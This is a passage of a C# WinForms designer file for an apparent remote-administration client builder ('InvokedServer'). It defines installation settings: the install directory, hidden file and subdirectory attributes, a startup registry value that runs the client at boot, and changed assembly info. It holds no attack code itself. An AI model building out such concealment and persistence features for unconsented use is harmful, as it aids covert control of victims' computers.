            this.guna2GradientButton6.Location = new System.Drawing.Point(759, 366);
            this.guna2GradientButton6.Name = "guna2GradientButton6";
            this.guna2GradientButton6.Size = new System.Drawing.Size(113, 23);
            this.guna2GradientButton6.TabIndex = 65;
            this.guna2GradientButton6.Text = "Save";
            this.guna2GradientButton6.Click += new System.EventHandler(this.guna2GradientButton6_Click);
            // 
            // guna2GroupBox3
            // 
            this.guna2GroupBox3.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom) 
            | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.guna2GroupBox3.BackColor = System.Drawing.Color.Transparent;
            this.guna2GroupBox3.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(35)))), ((int)(((byte)(35)))), ((int)(((byte)(35)))));
            this.guna2GroupBox3.BorderRadius = 2;
            this.guna2GroupBox3.Controls.Add(this.chkChangeAsmInfo);
            this.guna2GroupBox3.Controls.Add(this.guna2HtmlLabel13);
            this.guna2GroupBox3.Controls.Add(this.txtPreviewPath);
            this.guna2GroupBox3.Controls.Add(this.label12);
            this.guna2GroupBox3.Controls.Add(this.txtRegistryKeyName);
            this.guna2GroupBox3.Controls.Add(this.label11);
            this.guna2GroupBox3.Controls.Add(this.chkStartup);
            this.guna2GroupBox3.Controls.Add(this.guna2HtmlLabel12);
            this.guna2GroupBox3.Controls.Add(this.label10);
            this.guna2GroupBox3.Controls.Add(this.chkHideSubDirectory);
            this.guna2GroupBox3.Controls.Add(this.guna2HtmlLabel11);
            this.guna2GroupBox3.Controls.Add(this.chkHide);
            this.guna2GroupBox3.Controls.Add(this.guna2HtmlLabel10);
            this.guna2GroupBox3.Controls.Add(this.txtInstallName);
            this.guna2GroupBox3.Controls.Add(this.label9);
            this.guna2GroupBox3.Controls.Add(this.txtInstallSubDirectory);
            this.guna2GroupBox3.Controls.Add(this.label8);
            this.guna2GroupBox3.Controls.Add(this.pictureBox1);
            this.guna2GroupBox3.Controls.Add(this.picUAC1);
            this.guna2GroupBox3.Controls.Add(this.rbSystem);
            this.guna2GroupBox3.Controls.Add(this.rbProgramFiles);
            this.guna2GroupBox3.Controls.Add(this.label6);
            this.guna2GroupBox3.Controls.Add(this.rbAppdata);
            this.guna2GroupBox3.Controls.Add(this.chkInstall);
            this.guna2GroupBox3.Controls.Add(this.guna2HtmlLabel9);
            this.guna2GroupBox3.CustomBorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.guna2GroupBox3.CustomBorderThickness = new System.Windows.Forms.Padding(0, 25, 0, 0);
            this.guna2GroupBox3.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.guna2GroupBox3.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.guna2GroupBox3.ForeColor = System.Drawing.Color.WhiteSmoke;
            this.guna2GroupBox3.Location = new System.Drawing.Point(487, 8);
            this.guna2GroupBox3.Name = "guna2GroupBox3";
            this.guna2GroupBox3.Size = new System.Drawing.Size(385, 352);
            this.guna2GroupBox3.TabIndex = 64;
            this.guna2GroupBox3.Text = "Installation Settings";
            this.guna2GroupBox3.TextOffset = new System.Drawing.Point(0, -7);
            this.guna2GroupBox3.UseTransparentBackground = true;
            // 
            // chkChangeAsmInfo
            // 
            this.chkChangeAsmInfo.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.chkChangeAsmInfo.CheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(35)))), ((int)(((byte)(35)))), ((int)(((byte)(35)))));
            this.chkChangeAsmInfo.CheckedState.BorderRadius = 2;
            this.chkChangeAsmInfo.CheckedState.BorderThickness = 1;
            this.chkChangeAsmInfo.CheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.chkChangeAsmInfo.CheckMarkColor = System.Drawing.SystemColors.Control;
            this.chkChangeAsmInfo.Location = new System.Drawing.Point(257, 32);
            this.chkChangeAsmInfo.Name = "chkChangeAsmInfo";
            this.chkChangeAsmInfo.Size = new System.Drawing.Size(18, 18);
            this.chkChangeAsmInfo.TabIndex = 69;
            this.chkChangeAsmInfo.Text = "guna2CustomCheckBox5";
            this.tooltip.SetToolTip(this.chkChangeAsmInfo, "Change The Assembly Settings");
            this.chkChangeAsmInfo.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(35)))), ((int)(((byte)(35)))), ((int)(((byte)(35)))));
            this.chkChangeAsmInfo.UncheckedState.BorderRadius = 2;
            this.chkChangeAsmInfo.UncheckedState.BorderThickness = 1;
            this.chkChangeAsmInfo.UncheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.chkChangeAsmInfo.CheckedChanged += new System.EventHandler(this.chkChangeAsmInfo_CheckedChanged);
            // 
            // guna2HtmlLabel13
            // 
            this.guna2HtmlLabel13.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.guna2HtmlLabel13.BackColor = System.Drawing.Color.Transparent;
            this.guna2HtmlLabel13.Font = new System.Drawing.Font("Segoe UI", 8.25F);
            this.guna2HtmlLabel13.ForeColor = System.Drawing.SystemColors.Control;
            this.guna2HtmlLabel13.Location = new System.Drawing.Point(281, 33);
            this.guna2HtmlLabel13.Name = "guna2HtmlLabel13";
            this.guna2HtmlLabel13.Size = new System.Drawing.Size(95, 15);
            this.guna2HtmlLabel13.TabIndex = 70;
            this.guna2HtmlLabel13.Text = "Assembly Settings";
            this.tooltip.SetToolTip(this.guna2HtmlLabel13, "Change The Assembly Settings");
            // 
            // txtPreviewPath
            // 
            this.txtPreviewPath.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.txtPreviewPath.Animated = true;
            this.txtPreviewPath.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(35)))), ((int)(((byte)(35)))), ((int)(((byte)(35)))));
            this.txtPreviewPath.BorderRadius = 2;
            this.txtPreviewPath.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.txtPreviewPath.DefaultText = "";
            this.txtPreviewPath.DisabledState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(208)))), ((int)(((byte)(208)))), ((int)(((byte)(208)))));
            this.txtPreviewPath.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(226)))), ((int)(((byte)(226)))), ((int)(((byte)(226)))));
            this.txtPreviewPath.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(138)))), ((int)(((byte)(138)))), ((int)(((byte)(138)))));
            this.txtPreviewPath.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(138)))), ((int)(((byte)(138)))), ((int)(((byte)(138)))));
            this.txtPreviewPath.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.txtPreviewPath.FocusedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.txtPreviewPath.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.txtPreviewPath.ForeColor = System.Drawing.Color.White;
            this.txtPreviewPath.HoverState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.txtPreviewPath.Location = new System.Drawing.Point(11, 235);
            this.txtPreviewPath.Name = "txtPreviewPath";
            this.txtPreviewPath.PlaceholderText = "[/Path/to/file]";
            this.txtPreviewPath.SelectedText = "";
            this.txtPreviewPath.Size = new System.Drawing.Size(364, 23);
            this.txtPreviewPath.TabIndex = 68;
            // 
            // label12
            // 
            this.label12.AutoSize = true;
            this.label12.ForeColor = System.Drawing.SystemColors.Control;
            this.label12.Location = new System.Drawing.Point(11, 217);
            this.label12.Name = "label12";
            this.label12.Size = new System.Drawing.Size(158, 15);
            this.label12.TabIndex = 67;
            this.label12.Text = "Installation Location Preview";
            // 
            // txtRegistryKeyName
            // 
            this.txtRegistryKeyName.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.txtRegistryKeyName.Animated = true;
            this.txtRegistryKeyName.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(35)))), ((int)(((byte)(35)))), ((int)(((byte)(35)))));
            this.txtRegistryKeyName.BorderRadius = 2;
            this.txtRegistryKeyName.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.txtRegistryKeyName.DefaultText = "";
            this.txtRegistryKeyName.DisabledState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(208)))), ((int)(((byte)(208)))), ((int)(((byte)(208)))));
            this.txtRegistryKeyName.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(226)))), ((int)(((byte)(226)))), ((int)(((byte)(226)))));
            this.txtRegistryKeyName.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(138)))), ((int)(((byte)(138)))), ((int)(((byte)(138)))));
            this.txtRegistryKeyName.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(138)))), ((int)(((byte)(138)))), ((int)(((byte)(138)))));
            this.txtRegistryKeyName.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.txtRegistryKeyName.FocusedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.txtRegistryKeyName.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.txtRegistryKeyName.ForeColor = System.Drawing.Color.White;
            this.txtRegistryKeyName.HoverState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.txtRegistryKeyName.Location = new System.Drawing.Point(11, 321);
            this.txtRegistryKeyName.Name = "txtRegistryKeyName";
            this.txtRegistryKeyName.PlaceholderText = "[Name Of Startup Value]";
            this.txtRegistryKeyName.SelectedText = "";
            this.txtRegistryKeyName.Size = new System.Drawing.Size(364, 23);
            this.txtRegistryKeyName.TabIndex = 66;
            this.txtRegistryKeyName.TextChanged += new System.EventHandler(this.HasChangedSetting);
            // 
            // label11
            // 
            this.label11.AutoSize = true;
            this.label11.ForeColor = System.Drawing.SystemColors.Control;
            this.label11.Location = new System.Drawing.Point(11, 303);
            this.label11.Name = "label11";
            this.label11.Size = new System.Drawing.Size(72, 15);
            this.label11.TabIndex = 65;
            this.label11.Text = "Setup Name";
            // 
            // chkStartup
            // 
            this.chkStartup.CheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(35)))), ((int)(((byte)(35)))), ((int)(((byte)(35)))));
            this.chkStartup.CheckedState.BorderRadius = 2;
            this.chkStartup.CheckedState.BorderThickness = 1;
            this.chkStartup.CheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.chkStartup.CheckMarkColor = System.Drawing.SystemColors.Control;
            this.chkStartup.Location = new System.Drawing.Point(15, 282);
            this.chkStartup.Name = "chkStartup";
            this.chkStartup.Size = new System.Drawing.Size(18, 18);
            this.chkStartup.TabIndex = 63;
            this.chkStartup.Text = "guna2CustomCheckBox1";
            this.chkStartup.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(35)))), ((int)(((byte)(35)))), ((int)(((byte)(35)))));
            this.chkStartup.UncheckedState.BorderRadius = 2;
            this.chkStartup.UncheckedState.BorderThickness = 1;
            this.chkStartup.UncheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.chkStartup.CheckedChanged += new System.EventHandler(this.chkStartup_CheckedChanged);
            // 
            // guna2HtmlLabel12
            // 
            this.guna2HtmlLabel12.BackColor = System.Drawing.Color.Transparent;
            this.guna2HtmlLabel12.Font = new System.Drawing.Font("Segoe UI", 8.25F);
            this.guna2HtmlLabel12.ForeColor = System.Drawing.SystemColors.Control;
            this.guna2HtmlLabel12.Location = new System.Drawing.Point(39, 284);
            this.guna2HtmlLabel12.Name = "guna2HtmlLabel12";
            this.guna2HtmlLabel12.Size = new System.Drawing.Size(192, 15);
            this.guna2HtmlLabel12.TabIndex = 64;
            this.guna2HtmlLabel12.Text = "Run Client when the computer starts";
            // 
            // label10
            // 
            this.label10.AutoSize = true;
            this.label10.ForeColor = System.Drawing.SystemColors.Control;
            this.label10.Location = new System.Drawing.Point(11, 264);
            this.label10.Name = "label10";
            this.label10.Size = new System.Drawing.Size(56, 15);
            this.label10.TabIndex = 62;
            this.label10.Text = "Autostart";
            // 
            // chkHideSubDirectory
            // 
            this.chkHideSubDirectory.CheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(35)))), ((int)(((byte)(35)))), ((int)(((byte)(35)))));
            this.chkHideSubDirectory.CheckedState.BorderRadius = 2;
            this.chkHideSubDirectory.CheckedState.BorderThickness = 1;
            this.chkHideSubDirectory.CheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.chkHideSubDirectory.CheckMarkColor = System.Drawing.SystemColors.Control;
            this.chkHideSubDirectory.Location = new System.Drawing.Point(185, 194);
            this.chkHideSubDirectory.Name = "chkHideSubDirectory";
            this.chkHideSubDirectory.Size = new System.Drawing.Size(18, 18);
            this.chkHideSubDirectory.TabIndex = 60;
            this.chkHideSubDirectory.Text = "guna2CustomCheckBox1";
            this.chkHideSubDirectory.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(35)))), ((int)(((byte)(35)))), ((int)(((byte)(35)))));
            this.chkHideSubDirectory.UncheckedState.BorderRadius = 2;
            this.chkHideSubDirectory.UncheckedState.BorderThickness = 1;
            this.chkHideSubDirectory.UncheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            // 
            // guna2HtmlLabel11
            // 
            this.guna2HtmlLabel11.BackColor = System.Drawing.Color.Transparent;
            this.guna2HtmlLabel11.Font = new System.Drawing.Font("Segoe UI", 8.25F);
            this.guna2HtmlLabel11.ForeColor = System.Drawing.SystemColors.Control;
            this.guna2HtmlLabel11.Location = new System.Drawing.Point(209, 195);
            this.guna2HtmlLabel11.Name = "guna2HtmlLabel11";
            this.guna2HtmlLabel11.Size = new System.Drawing.Size(162, 15);
            this.guna2HtmlLabel11.TabIndex = 61;
            this.guna2HtmlLabel11.Text = "Set subdir attributes to hidden";
            // 
            // chkHide
            // 
            this.chkHide.CheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(35)))), ((int)(((byte)(35)))), ((int)(((byte)(35)))));
            this.chkHide.CheckedState.BorderRadius = 2;
            this.chkHide.CheckedState.BorderThickness = 1;
            this.chkHide.CheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.chkHide.CheckMarkColor = System.Drawing.SystemColors.Control;
            this.chkHide.Location = new System.Drawing.Point(11, 194);
            this.chkHide.Name = "chkHide";
            this.chkHide.Size = new System.Drawing.Size(18, 18);
            this.chkHide.TabIndex = 58;
            this.chkHide.Text = "guna2CustomCheckBox1";
            this.chkHide.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(35)))), ((int)(((byte)(35)))), ((int)(((byte)(35)))));
            this.chkHide.UncheckedState.BorderRadius = 2;
            this.chkHide.UncheckedState.BorderThickness = 1;
            this.chkHide.UncheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.chkHide.CheckedChanged += new System.EventHandler(this.HasChangedSetting);
            // 
            // guna2HtmlLabel10
            // 
            this.guna2HtmlLabel10.BackColor = System.Drawing.Color.Transparent;
            this.guna2HtmlLabel10.Font = new System.Drawing.Font("Segoe UI", 8.25F);
            this.guna2HtmlLabel10.ForeColor = System.Drawing.SystemColors.Control;
            this.guna2HtmlLabel10.Location = new System.Drawing.Point(35, 195);
            this.guna2HtmlLabel10.Name = "guna2HtmlLabel10";
            this.guna2HtmlLabel10.Size = new System.Drawing.Size(145, 15);
            this.guna2HtmlLabel10.TabIndex = 59;
            this.guna2HtmlLabel10.Text = "Set file attributes to hidden";
            // 
            // txtInstallName
            // 
            this.txtInstallName.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.txtInstallName.Animated = true;
            this.txtInstallName.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(35)))), ((int)(((byte)(35)))), ((int)(((byte)(35)))));
            this.txtInstallName.BorderRadius = 2;
            this.txtInstallName.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.txtInstallName.DefaultText = "";
            this.txtInstallName.DisabledState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(208)))), ((int)(((byte)(208)))), ((int)(((byte)(208)))));
            this.txtInstallName.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(226)))), ((int)(((byte)(226)))), ((int)(((byte)(226)))));
            this.txtInstallName.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(138)))), ((int)(((byte)(138)))), ((int)(((byte)(138)))));
            this.txtInstallName.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(138)))), ((int)(((byte)(138)))), ((int)(((byte)(138)))));
            this.txtInstallName.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.txtInstallName.FocusedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.txtInstallName.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.txtInstallName.ForeColor = System.Drawing.Color.White;
            this.txtInstallName.HoverState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.txtInstallName.Location = new System.Drawing.Point(11, 166);
            this.txtInstallName.Name = "txtInstallName";
            this.txtInstallName.PlaceholderText = "[Executable Name]";
            this.txtInstallName.SelectedText = "";
            this.txtInstallName.Size = new System.Drawing.Size(364, 23);
            this.txtInstallName.TabIndex = 57;
            this.txtInstallName.TextChanged += new System.EventHandler(this.HasChangedSettingAndFilePath);
            this.txtInstallName.KeyPress += new System.Windows.Forms.KeyPressEventHandler(this.txtInstallName_KeyPress);
            // 
            // label9
            // 
            this.label9.AutoSize = true;
            this.label9.ForeColor = System.Drawing.SystemColors.Control;
            this.label9.Location = new System.Drawing.Point(11, 148);
            this.label9.Name = "label9";
            this.label9.Size = new System.Drawing.Size(73, 15);
            this.label9.TabIndex = 56;
            this.label9.Text = "Install Name";
            // 
            // txtInstallSubDirectory
            // 
            this.txtInstallSubDirectory.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.txtInstallSubDirectory.Animated = true;
            this.txtInstallSubDirectory.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(35)))), ((int)(((byte)(35)))), ((int)(((byte)(35)))));
            this.txtInstallSubDirectory.BorderRadius = 2;
            this.txtInstallSubDirectory.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.txtInstallSubDirectory.DefaultText = "";
            this.txtInstallSubDirectory.DisabledState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(208)))), ((int)(((byte)(208)))), ((int)(((byte)(208)))));
            this.txtInstallSubDirectory.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(226)))), ((int)(((byte)(226)))), ((int)(((byte)(226)))));
            this.txtInstallSubDirectory.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(138)))), ((int)(((byte)(138)))), ((int)(((byte)(138)))));
            this.txtInstallSubDirectory.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(138)))), ((int)(((byte)(138)))), ((int)(((byte)(138)))));
            this.txtInstallSubDirectory.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.txtInstallSubDirectory.FocusedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.txtInstallSubDirectory.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.txtInstallSubDirectory.ForeColor = System.Drawing.Color.White;
            this.txtInstallSubDirectory.HoverState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.txtInstallSubDirectory.Location = new System.Drawing.Point(11, 120);
            this.txtInstallSubDirectory.Name = "txtInstallSubDirectory";
            this.txtInstallSubDirectory.PlaceholderText = "[Folder Name]";
            this.txtInstallSubDirectory.SelectedText = "";
            this.txtInstallSubDirectory.Size = new System.Drawing.Size(364, 23);
            this.txtInstallSubDirectory.TabIndex = 55;
            this.txtInstallSubDirectory.TextChanged += new System.EventHandler(this.HasChangedSettingAndFilePath);
            this.txtInstallSubDirectory.KeyPress += new System.Windows.Forms.KeyPressEventHandler(this.txtInstallSubDirectory_KeyPress);
            // 
            // label8
            // 
            this.label8.AutoSize = true;
            this.label8.ForeColor = System.Drawing.SystemColors.Control;
            this.label8.Location = new System.Drawing.Point(11, 102);
            this.label8.Name = "label8";
            this.label8.Size = new System.Drawing.Size(108, 15);
            this.label8.TabIndex = 54;
            this.label8.Text = "Install Subdirectory";
            // 
            // pictureBox1
            // 
            this.pictureBox1.Image = global::InvokedServer.Properties.Resources.uac_shield;
            this.pictureBox1.Location = new System.Drawing.Point(335, 75);
            this.pictureBox1.Name = "pictureBox1";
            this.pictureBox1.Size = new System.Drawing.Size(16, 20);
            this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.AutoSize;
            this.pictureBox1.TabIndex = 53;
            this.pictureBox1.TabStop = false;
            this.tooltip.SetToolTip(this.pictureBox1, "Administrator Privileges are required to install the client in Program Files.");
            // 
            // picUAC1
            // 
            this.picUAC1.Image = global::InvokedServer.Properties.Resources.uac_shield;
            this.picUAC1.Location = new System.Drawing.Point(250, 75);
            this.picUAC1.Name = "picUAC1";
            this.picUAC1.Size = new System.Drawing.Size(16, 20);
            this.picUAC1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.AutoSize;
            this.picUAC1.TabIndex = 52;
            this.picUAC1.TabStop = false;
            this.tooltip.SetToolTip(this.picUAC1, "Administrator Privileges are required to install the client in Program Files.");
            // 
            // rbSystem
            // 
            this.rbSystem.AutoSize = true;
            this.rbSystem.CheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(35)))), ((int)(((byte)(35)))), ((int)(((byte)(35)))));
            this.rbSystem.CheckedState.BorderThickness = 0;
            this.rbSystem.CheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.rbSystem.CheckedState.InnerColor = System.Drawing.Color.White;
            this.rbSystem.CheckedState.InnerOffset = -4;
            this.rbSystem.Location = new System.Drawing.Point(272, 76);
            this.rbSystem.Name = "rbSystem";
            this.rbSystem.Size = new System.Drawing.Size(63, 19);
            this.rbSystem.TabIndex = 51;
            this.rbSystem.Text = "System";
            this.rbSystem.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(35)))), ((int)(((byte)(35)))), ((int)(((byte)(35)))));
            this.rbSystem.UncheckedState.BorderThickness = 2;
            this.rbSystem.UncheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.rbSystem.UncheckedState.InnerColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.rbSystem.CheckedChanged += new System.EventHandler(this.HasChangedSettingAndFilePath);
            // 
            // rbProgramFiles
            // 
            this.rbProgramFiles.AutoSize = true;
            this.rbProgramFiles.CheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(35)))), ((int)(((byte)(35)))), ((int)(((byte)(35)))));
            this.rbProgramFiles.CheckedState.BorderThickness = 0;
            this.rbProgramFiles.CheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.rbProgramFiles.CheckedState.InnerColor = System.Drawing.Color.White;
            this.rbProgramFiles.CheckedState.InnerOffset = -4;
            this.rbProgramFiles.Location = new System.Drawing.Point(156, 76);
            this.rbProgramFiles.Name = "rbProgramFiles";
            this.rbProgramFiles.Size = new System.Drawing.Size(97, 19);
            this.rbProgramFiles.TabIndex = 50;
            this.rbProgramFiles.Text = "Program Files";
            this.rbProgramFiles.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(35)))), ((int)(((byte)(35)))), ((int)(((byte)(35)))));
            this.rbProgramFiles.UncheckedState.BorderThickness = 2;
            this.rbProgramFiles.UncheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.rbProgramFiles.UncheckedState.InnerColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.rbProgramFiles.CheckedChanged += new System.EventHandler(this.HasChangedSettingAndFilePath);
            // 
            // label6
            // 
            this.label6.AutoSize = true;
            this.label6.ForeColor = System.Drawing.SystemColors.Control;
            this.label6.Location = new System.Drawing.Point(11, 59);
            this.label6.Name = "label6";
            this.label6.Size = new System.Drawing.Size(116, 15);
            this.label6.TabIndex = 49;
            this.label6.Text = "Installation Directory";
            // 
            // rbAppdata
            // 
            this.rbAppdata.AutoSize = true;
            this.rbAppdata.CheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(35)))), ((int)(((byte)(35)))), ((int)(((byte)(35)))));
            this.rbAppdata.CheckedState.BorderThickness = 0;
            this.rbAppdata.CheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.rbAppdata.CheckedState.InnerColor = System.Drawing.Color.White;
            this.rbAppdata.CheckedState.InnerOffset = -4;
            this.rbAppdata.Location = new System.Drawing.Point(11, 77);
            this.rbAppdata.Name = "rbAppdata";
            this.rbAppdata.Size = new System.Drawing.Size(139, 19);
            this.rbAppdata.TabIndex = 48;
            this.rbAppdata.Text = "User Application Data";
            this.rbAppdata.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(35)))), ((int)(((byte)(35)))), ((int)(((byte)(35)))));
            this.rbAppdata.UncheckedState.BorderThickness = 2;
            this.rbAppdata.UncheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.rbAppdata.UncheckedState.InnerColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.rbAppdata.CheckedChanged += new System.EventHandler(this.HasChangedSettingAndFilePath);
            // 
            // chkInstall
            // 
            this.chkInstall.CheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(35)))), ((int)(((byte)(35)))), ((int)(((byte)(35)))));
            this.chkInstall.CheckedState.BorderRadius = 2;
            this.chkInstall.CheckedState.BorderThickness = 1;
            this.chkInstall.CheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.chkInstall.CheckMarkColor = System.Drawing.SystemColors.Control;
            this.chkInstall.Location = new System.Drawing.Point(11, 31);
            this.chkInstall.Name = "chkInstall";
            this.chkInstall.Size = new System.Drawing.Size(18, 18);
            this.chkInstall.TabIndex = 46;
            this.chkInstall.Text = "guna2CustomCheckBox1";
            this.chkInstall.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(35)))), ((int)(((byte)(35)))), ((int)(((byte)(35)))));
            this.chkInstall.UncheckedState.BorderRadius = 2;
            this.chkInstall.UncheckedState.BorderThickness = 1;
            this.chkInstall.UncheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.chkInstall.CheckedChanged += new System.EventHandler(this.chkInstall_CheckedChanged);
            // 
            // guna2HtmlLabel9
            // 
            this.guna2HtmlLabel9.BackColor = System.Drawing.Color.Transparent;
            this.guna2HtmlLabel9.Font = new System.Drawing.Font("Segoe UI", 8.25F);
